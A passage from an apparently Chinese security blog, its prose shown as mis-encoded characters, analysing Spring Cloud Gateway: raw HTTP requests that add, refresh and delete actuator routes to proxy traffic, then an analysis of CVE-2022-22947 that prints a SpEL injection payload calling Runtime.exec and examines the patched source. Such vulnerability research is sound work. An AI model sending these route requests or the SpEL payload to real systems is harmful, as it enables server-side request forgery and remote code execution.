<h3 id="1-3-2-æ·»åŠ -Spring-Cloud-Gateway-route-çš„-Raw-HTTP-è¯·æ±‚"><a href="#1-3-2-æ·»åŠ -Spring-Cloud-Gateway-route-çš„-Raw-HTTP-è¯·æ±‚" class="headerlink" title="1.3.2 æ·»åŠ  Spring Cloud Gateway route çš„ Raw HTTP è¯·æ±‚"></a>1.3.2 æ·»åŠ  Spring Cloud Gateway route çš„ Raw HTTP è¯·æ±‚</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain"># /actuator/gateway/routes/&#123;id&#125;ï¼šè¿™é‡Œ &#123;id&#125; = new_route ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º new_route çš„è·¯ç”±<br>POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br>Content-Type: application/json<br><br>#è·¯ç”±çš„ä¸»ä½“<br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  # å°† /new_route/... é‡å†™ä¸º /...  ï¼Œç»å…¸çš„ URL æ¸…æ´—æ–¹å¼<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route(?&lt;path&gt;.*)&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  #ç›®æ ‡ç«™ç‚¹ï¼ˆè¿™é‡Œæ˜¯ Wyatt å¸ˆå‚…çš„ç«™ç‚¹ï¼‰<br>  &quot;uri&quot;: &quot;https://wya.pl&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p>çŠ¶æ€ç  201ï¼Œ å·²ç»æˆåŠŸåˆ›å»ºäº†æ–°çš„è·¯ç”±ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054165.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è®¿é—®æ–°è·¯ç”±ï¼šè¿™æ—¶å€™å› ä¸ºè¿˜æ²¡æœ‰åˆ·æ–°ï¼Œæ‰€ä»¥è¿”å› 404</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /new_route HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054221.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ä¼ å…¥ï¼šå‘é€åˆ·æ–°è¯·æ±‚ï¼Œè®©æœåŠ¡é‡‡ç”¨æ–°è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: localhost:9000<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 230<br><br>&#123;<br>  &quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;,<br>  &quot;route_id&quot;: &quot;new_route&quot;,<br>  &quot;filters&quot;: [<br>    &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /$&#123;path&#125;], order = 1]&quot;<br>  ],<br>  &quot;uri&quot;: &quot;https://wya.pl&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054725.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹è·¯ç”±ç¡®è®¤ new_routes å·²è¢«æ·»åŠ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057823.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="å°æ’æ›²ï¼Œå¯ä»¥è·³è¿‡"><a href="#å°æ’æ›²ï¼Œå¯ä»¥è·³è¿‡" class="headerlink" title="å°æ’æ›²ï¼Œå¯ä»¥è·³è¿‡"></a>å°æ’æ›²ï¼Œå¯ä»¥è·³è¿‡</h4><p>æˆ‘è¿™é‡Œå‡ºç°ä¸€ä¸ªå°é”™è¯¯ï¼š</p>
<p>è®¿é—®è·¯ç”±æ—¶è¿”å› 500 é”™è¯¯ï¼ŒGateway æ— æ³•ä¸ <a target="_blank" rel="noopener" href="https://wya.pl/">https://wya.pl</a> å»ºç«‹è¿æ¥</p>
<p>æŠ¥é”™æ—¥å¿—ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057165.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p> JDK 1.8.0_65 <strong>ä¸ä¿¡ä»» wya.pl ç½‘ç«™çš„ SSL è¯ä¹¦</strong>ã€‚  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /new_route/ HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057402.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è¯•ç€æ¢æˆ JDK 11</p>
<p>åˆçˆ†äº† 502 .ã€‚ã€‚</p>
<p> Cloudflare&#x2F;WP&#x2F;æŸäº› nginx é…ç½®å¯èƒ½ä¼šæ‹’ç»æ²¡æœ‰ UA çš„è¯·æ±‚ã€‚  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054299.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æ·»åŠ  UA å¤´ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route(?&lt;path&gt;.*)&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;,<br>    &#123;<br>      &quot;name&quot;: &quot;AddRequestHeader&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;User-Agent&quot;,<br>        &quot;_genkey_1&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://wya.pl&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¸è¡Œã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057629.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æœ€åæˆ‘æŠŠç½‘å€æ¢æˆè‡ªå·±çš„ï¼Œå¯ä»¥è®¿é—®åˆ°ã€‚</p>
<h4 id="å®Œæ•´çš„æ·»åŠ è·¯ç”±è¿‡ç¨‹ï¼š"><a href="#å®Œæ•´çš„æ·»åŠ è·¯ç”±è¿‡ç¨‹ï¼š" class="headerlink" title="å®Œæ•´çš„æ·»åŠ è·¯ç”±è¿‡ç¨‹ï¼š"></a>å®Œæ•´çš„æ·»åŠ è·¯ç”±è¿‡ç¨‹ï¼š</h4><ol>
<li>åˆ›å»ºè·¯ç”±</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route(?&lt;path&gt;.*)&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054915.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol>
<li>åˆ·æ–°è·¯ç”±</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: localhost:9000<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057207.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol start="2">
<li>æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054589.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol start="3">
<li>è®¿é—®è·¯ç”±</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /new_route/ HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057965.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol start="4">
<li>æ¸…ç†</li>
</ol>
<p>å®Œæˆæµ‹è¯•åï¼Œä¸ºäº†ç¡®ä¿åº”ç”¨ç¨‹åºä¸ä¼šå¤„äºä¸å®‰å…¨çš„çŠ¶æ€ï¼Œè¿›è¡Œæ¸…ç†å·¥ä½œæ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">DELETE /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057048.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åŒæ ·çš„ï¼Œæ‰§è¡Œåˆ·æ–°ä¹‹åæ‰ä¼šç”Ÿæ•ˆã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: localhost:9000<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åˆšæ‰åˆ›å»ºçš„è·¯å¾„å·²ç»ä¸å­˜åœ¨äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054704.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è¿™å°±æ˜¯æˆåŠŸå¾—å°†ä¸€æ¡æ–°çš„è·¯ç”±æ·»åŠ åˆ°äº†ç¨‹åºä¸­ï¼Œé€šè¿‡ä½¿ç”¨è¿™ä¸ªç«¯ç‚¹æˆ‘ä»¬å¯ä»¥å°†æµé‡ä»£ç†åˆ°å®ƒèƒ½å¤Ÿè®¿é—®çš„ä»»ä½•æœåŠ¡å™¨ä¸Šï¼ˆå½“ç„¶ï¼Œæ­£å¦‚ä¸Šæ–‡ä¸­æˆ‘æ‰€é‡åˆ°çš„é—®é¢˜ï¼Œ Cloudflare æˆ–è€…å…¶ä»–çš„æœåŠ¡å™¨ä¹Ÿä¼šå¯¹è¿™äº›æµé‡è¿›è¡Œé˜²æŠ¤ã€æ‹¦æˆªã€è¿‡æ»¤ç­‰ï¼‰ï¼Œ</p>
<h2 id="1-4-æ€»ç»“"><a href="#1-4-æ€»ç»“" class="headerlink" title="1.4 æ€»ç»“"></a>1.4 æ€»ç»“</h2><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><blockquote>
<p>The gateway router actuator is pretty powerful. It can allow for users to discover predefined routes along with the ability to add or delete routes. This could lead to cloud metadata keys being taken, internal applications being exposed, or denial of service attacks. Note that any changes made through this actuator are only in memory. Restarting the application will restore the original routes defined by the application.</p>
</blockquote>
<blockquote>
<p>The documentation from Spring goes a lot more in depth about how it works and some other ways to configure the routes. I encourage you to check out the details here: <a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-gateway/reference/html/">https://cloud.spring.io/spring-cloud-gateway/reference/html/</a></p>
</blockquote>
<blockquote>
<p>I havenâ€™t seen anyone put together the proper requests as most of Springâ€™s examples are in code. I managed to scrape together enough details by searching Github and looking at the source code in the library. It was really exciting to get this working in a lab and then test it out on a bug bounty target.</p>
</blockquote>
<blockquote>
<p>This actuator hasnâ€™t been in wordlists or scanners, so Iâ€™ve gone ahead and submitted PRs to Dirsearch, Seclists, and Nuclei.</p>
</blockquote>
<blockquote>
<p>If youâ€™ve had success with this in an engagement or bug bounty Iâ€™d love to hear about it. Share what you are able to on <a target="_blank" rel="noopener" href="https://twitter.com/wdahlenb">Twitter</a>.</p>
</blockquote>
<blockquote>
<p><strong>Update 1&#x2F;2&#x2F;22</strong>: I have created a sample application to allow others to test out the gateway actuator here: <a target="_blank" rel="noopener" href="https://github.com/wdahlenburg/spring-gateway-demo">https://github.com/wdahlenburg/spring-gateway-demo</a></p>
</blockquote>
<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>ç½‘å…³è·¯ç”±å™¨æ‰§è¡Œå™¨åŠŸèƒ½å¼ºå¤§ã€‚å®ƒèƒ½è®©ç”¨æˆ·å‘ç°é¢„è®¾çš„è·¯ç”±ï¼Œå¹¶ä¸”å…·å¤‡æ·»åŠ æˆ–åˆ é™¤è·¯ç”±çš„èƒ½åŠ›ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´äº‘å…ƒæ•°æ®å¯†é’¥è¢«è·å–ã€å†…éƒ¨åº”ç”¨ç¨‹åºè¢«æš´éœ²ï¼Œæˆ–è€…å¼•å‘æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¯·æ³¨æ„ï¼Œ<strong>é€šè¿‡æ­¤æ‰§è¡Œå™¨æ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½åªåœ¨å†…å­˜ä¸­</strong>ã€‚é‡æ–°å¯åŠ¨åº”ç”¨ç¨‹åºå°†æ¢å¤ç”±åº”ç”¨ç¨‹åºå®šä¹‰çš„åŸå§‹è·¯ç”±ã€‚</p>
<p>Spring çš„ç›¸å…³æ–‡æ¡£å¯¹å®ƒçš„å·¥ä½œåŸç†ä»¥åŠä¸€äº›å…¶ä»–é…ç½®è·¯ç”±çš„æ–¹æ³•è¿›è¡Œäº†æ›´æ·±å…¥çš„é˜è¿°ã€‚æˆ‘é¼“åŠ±æ‚¨åœ¨æ­¤å¤„æŸ¥çœ‹è¯¦ç»†å†…å®¹ï¼š<a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-gateway/reference/html/">https://cloud.spring.io/spring-cloud-gateway/reference/html/</a></p>
<p>æˆ‘è¿˜æ²¡è§è¿‡æœ‰äººèƒ½æ­£ç¡®åœ°æå‡ºç›¸å…³è¯·æ±‚ï¼Œå› ä¸º Spring çš„å¤§å¤šæ•°ç¤ºä¾‹éƒ½æ˜¯ä»¥ä»£ç å½¢å¼å‘ˆç°çš„ã€‚æˆ‘é€šè¿‡åœ¨ Github ä¸Šæœç´¢ä»¥åŠæŸ¥çœ‹åº“ä¸­çš„æºä»£ç ï¼Œæ€»ç®—æ•´ç†å‡ºäº†è¶³å¤Ÿçš„ç»†èŠ‚ã€‚åœ¨å®éªŒå®¤ä¸­æˆåŠŸå®ç°è¿™ä¸€åŠŸèƒ½ï¼Œå¹¶éšååœ¨æ¼æ´èµé‡‘ç›®æ ‡ä¸Šè¿›è¡Œæµ‹è¯•ï¼Œè¿™çœŸçš„è®©æˆ‘æ„Ÿåˆ°éå¸¸å…´å¥‹ã€‚</p>
<p>è¿™ä¸ªé©±åŠ¨å™¨å°šæœªå‡ºç°åœ¨è¯å…¸æˆ–æ‰«æå™¨ä¸­ï¼Œæ‰€ä»¥æˆ‘å·²ç»å‘ Dirsearchã€Seclists å’Œ Nuclei æäº¤äº† pull è¯·æ±‚ã€‚</p>
<p>å¦‚æœæ‚¨åœ¨å‚ä¸æ´»åŠ¨æˆ–æ¼æ´èµé‡‘é¡¹ç›®ä¸­å–å¾—äº†æˆåŠŸï¼Œæˆ‘å¾ˆä¹æ„å¬æ‚¨åˆ†äº«ç›¸å…³æƒ…å†µã€‚è¯·åœ¨æ¨ç‰¹ä¸Šåˆ†äº«æ‚¨æ‰€æŒæ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<p>æ›´æ–°äº 2022 å¹´ 1 æœˆ 2 æ—¥ï¼šæˆ‘å·²åˆ›å»ºäº†ä¸€ä¸ªç¤ºä¾‹åº”ç”¨ç¨‹åºï¼Œä»¥ä¾¿å…¶ä»–äººèƒ½å¤Ÿåœ¨æ­¤æµ‹è¯•ç½‘å…³æ‰§è¡Œå™¨ï¼š<a target="_blank" rel="noopener" href="https://github.com/wdahlenburg/spring-gateway-demo">https://github.com/wdahlenburg/spring-gateway-demo</a></p>
<p>æ€»å¾—æ¥è¯´ Spring Cloud Gateway çš„ Actuator åŠŸèƒ½è¿‡å¼ºï¼Œå¦‚æœä¸åŠ ä»¥ä¿æŠ¤ï¼Œç”¨æˆ·å°±å¯ä»¥ç›´æ¥é€šè¿‡ HTTP POST æ·»åŠ ã€ä¿®æ”¹è·¯ç”±ã€‚</p>
<h1 id="äºŒã€CVE-2022-22947ï¼šSpEL-ç±»å‹è½¬æ¢ä¸æ¶æ„-Beans"><a href="#äºŒã€CVE-2022-22947ï¼šSpEL-ç±»å‹è½¬æ¢ä¸æ¶æ„-Beans" class="headerlink" title="äºŒã€CVE-2022-22947ï¼šSpEL ç±»å‹è½¬æ¢ä¸æ¶æ„ Beans"></a>äºŒã€CVE-2022-22947ï¼šSpEL ç±»å‹è½¬æ¢ä¸æ¶æ„ Beans</h1><p>ä½œè€… Wyatt åœ¨ç ”ç©¶ Spring Cloud Gateway Server çš„æºç æ—¶ï¼Œå‘ç°ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨äº† SpELï¼Œ</p>
<p>SpEL æœ¬èº«ä¸æ˜¯æ¼æ´ï¼Œä½†æœ‰ä¸€ä¸ªåŸºæœ¬å®‰å…¨åŸåˆ™ï¼š<strong>å¤–éƒ¨è¾“å…¥ï¼ˆç”¨æˆ·å¯æ§çš„æ•°æ®ï¼‰ç»ä¸èƒ½ç›´æ¥è¿›å…¥ SpEL è¡¨è¾¾å¼è§£æå™¨</strong>ï¼Œå› ä¸º</p>
<ul>
<li>SpEL èƒ½æ‰§è¡Œæ–¹æ³•è°ƒç”¨</li>
<li>SpEL èƒ½è®¿é—® Spring Bean</li>
<li>SpEL ç”šè‡³å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„ Java ä»£ç </li>
</ul>
<p>é‚£ä¹ˆåœ¨é…ç½®è·¯ç”±ä¸­ï¼Œå°±å¯ä»¥ç»™æŸä¸ªå‚æ•°æ³¨å…¥æ¶æ„çš„ JSONï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;<br>  &quot;id&quot;: &quot;evil&quot;,<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;regexp&quot;: &quot;.*&quot;,<br>        &quot;replacement&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;<br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>replacement</code> å­—æ®µè¢«ä½œä¸º SpEL å¤„ç†ï¼Œæ‰§è¡Œ <code>getRuntime.exec()</code>ã€‚è¿™å°±æ˜¯ CVE-2022-22947</p>
<p><strong>3.0.x å’Œ 3.1.x ç‰ˆæœ¬å·²è¿›è¡Œäº†è¿½æº¯æ€§ä¿®å¤ã€‚</strong></p>
<p>CVE-2022-22947 çš„å½±å“ç‰ˆæœ¬æ˜¯ï¼š</p>
<ul>
<li><strong>3.0.0</strong></li>
<li><strong>3.1.0</strong></li>
<li><strong>2.2.0 RELEASE ï½ 2.2.6.RELEASE</strong></li>
</ul>
<p>å®˜æ–¹å·²ç»ç¡®è®¤ï¼š</p>
<p>âœ” <strong>2.2.7.RELEASEåŒ…å«è¡¥ä¸</strong><br>âœ” <strong>ShortcutConfigurable å·²è¢«ç§»é™¤</strong><br>âœ” <strong>getValue() ä¸å†ç”¨ StandardEvaluationContextï¼ˆç¦æ­¢ RCEï¼‰</strong></p>
<p><strong>æ¼æ´çš„æ ¸å¿ƒå°±æ˜¯ Spring Cloud Gateway æŸäº› Filter ï¼ˆRewritePathï¼‰æ”¯æŒä½¿ç”¨ SpEL è¡¨è¾¾å¼</strong> <code>#{ }</code><strong>ï¼Œè€Œ Gateway Actuator åˆå…è®¸ç”¨æˆ·åŠ¨æ€æ·»åŠ è·¯ç”±ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æŠŠæ¶æ„ SpEL æ³¨å…¥ RewritePath çš„å‚æ•°ä¸­ï¼Œä»è€Œè¾¾åˆ° RCEã€‚</strong></p>
<h2 id="2-1-åˆ†ææºç "><a href="#2-1-åˆ†ææºç " class="headerlink" title="2.1 åˆ†ææºç "></a>2.1 åˆ†ææºç </h2><p>ä½ç½®ï¼š<code>org\springframework\cloud\spring-cloud-gateway-server\**2.2.7.RELEASE**\spring-cloud-gateway-server-2.2.7.RELEASE.jar!\org\springframework\cloud\gateway\support\ShortcutConfigurable.class</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058243.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>å¯ä»¥çœ‹åˆ° <code>StandardEvaluationContext</code> ä¸Šä¸‹æ–‡ï¼Œå®ƒå…è®¸è°ƒç”¨æˆ–æ‰§è¡Œä»»ä½•æœ‰æ•ˆçš„è¡¨è¾¾å¼ï¼Œ<code>StandardEvaluationContext</code> æ˜¯å®Œå…¨å¼€æ”¾çš„ SpEL ç¯å¢ƒã€‚ å¦‚æœèƒ½æ§åˆ¶ getValue æ–¹æ³•çš„è°ƒç”¨ï¼Œè¿™çœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ªæ½œåœ¨çš„ç›®æ ‡ã€‚</p>
<p>è¿™æ˜¯å·²ç»ä¿®æ”¹çš„æºç ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">org</span>\springframework\cloud\spring-cloud-gateway-server\**<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-SNAPSHOT**\spring-cloud-gateway-server-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-SNAPSHOT.jar!\org\springframework\cloud\gateway\support\ShortcutConfigurable.class<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054161.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GatewayEvaluationContext context <span class="hljs-operator">=</span> new GatewayEvaluationContext(beanFactory)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>Spring Cloud Gateway åœ¨å®‰å…¨ç‰ˆæœ¬ä¸­åŠ å…¥äº†è‡ªå·±çš„ GatewayEvaluationContext</p>
<p>â†’ é™åˆ¶äº†å¯ç”¨çš„ SpEL å‡½æ•°</p>
<p>â†’ ç¦æ­¢è®¿é—® Runtimeã€ClassLoader ç­‰å±é™©ç±»</p>
<p>â†’ ä¸èƒ½æ‰§è¡Œä»»æ„ Java ä»£ç </p>
<blockquote>
<p>The ShortcutConfigurable.java file defines an interface. I ended up googling it and came across the <a target="_blank" rel="noopener" href="https://www.javadoc.io/static/org.springframework.cloud/spring-cloud-gateway-core/2.2.0.RELEASE/org/springframework/cloud/gateway/support/ShortcutConfigurable.html">Javadocs</a>, which helpfully display the known implementing classes. I started going through them trying to see if there was a place I might have input into.</p>
<p>If you look closely, the <a target="_blank" rel="noopener" href="https://www.javadoc.io/static/org.springframework.cloud/spring-cloud-gateway-core/2.2.0.RELEASE/org/springframework/cloud/gateway/filter/factory/RewritePathGatewayFilterFactory.html">RewritePathGatewayFilterFactory</a> class implements the ShortcutConfigurable interface. If you are really paying attention and read my <a target="_blank" rel="noopener" href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">first post on the gateway actuator</a>, then youâ€™d recognize that the RewritePath filter was applied there. That seemed like a wild coincidence.</p>
</blockquote>
